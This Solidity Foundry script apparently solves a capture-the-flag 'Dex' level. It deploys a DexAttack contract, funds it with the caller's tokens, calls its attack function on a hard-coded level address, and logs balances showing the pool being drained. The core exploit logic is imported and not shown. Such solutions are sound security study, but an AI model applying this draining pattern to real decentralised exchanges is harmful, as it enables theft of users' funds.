// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Dex, SwappableToken} from "../src/levels/Dex.sol";
import {DexAttack} from "../src/attacks/DexAttack.sol";

contract DexScript is Script {
    Dex public instance = Dex(payable(0x908F70cC8E294B14c289386CF629110e2a028E1e));
    DexAttack attacker;

    function run() external {
	vm.startBroadcast();

	SwappableToken token1 = SwappableToken(payable(instance.token1()));
	SwappableToken token2 = SwappableToken(payable(instance.token2()));

	address levelAddress = address(instance);

	uint256 token1Balance = token1.balanceOf(msg.sender);
	uint256 token2Balance = token2.balanceOf(msg.sender);

	attacker = new DexAttack();
	console.log("DexAttack Contract deployed to:", address(attacker));

	console.log("Transfering tokens to DexAttack Contract...");
	token1.transfer(address(attacker), token1Balance);
	token2.transfer(address(attacker), token2Balance);

	console.log("Dex Token 1 initial balance:", token1.balanceOf(levelAddress));
	console.log("Dex Token 2 initial balance:", token2.balanceOf(levelAddress));
	console.log("DexAttack Token 1 initial balance:", token1.balanceOf(address(attacker)));
	console.log("DexAttack Token 2 initial balance:", token2.balanceOf(address(attacker)));

	console.log("Attacking...");
	attacker.attack(levelAddress);

	console.log("Dex Token 1 final balance:", token1.balanceOf(levelAddress));
	console.log("Dex Token 2 final balance:", token2.balanceOf(levelAddress));
	console.log("DexAttack Token 1 final balance:", token1.balanceOf(address(attacker)));
	console.log("DexAttack Token 2 final balance:", token2.balanceOf(address(attacker)));
	
	vm.stopBroadcast();
    }
}
